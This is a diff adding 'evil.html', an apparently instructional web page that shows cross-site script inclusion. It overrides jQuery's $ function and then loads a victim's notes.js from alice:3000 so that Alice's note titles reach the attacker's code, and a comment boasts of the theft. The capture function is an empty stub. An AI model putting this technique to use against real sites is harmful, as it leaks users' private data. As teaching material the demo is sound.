@@ -1,0 +1,27 @@
+<!-- evil.html -->
+
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>evil</title>
+    <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+  </head>
+  <body>
+
+    <ul id="notes"></ul>
+
+    <script>
+      var $ = function() {
+        return {
+          append: function(html) {
+            // we just stole Alice's note titles!
+          }
+        };
+      };
+    </script>
+
+    <script src="http://alice:3000/notes.js"></script>
+
+  </body>
+</html>
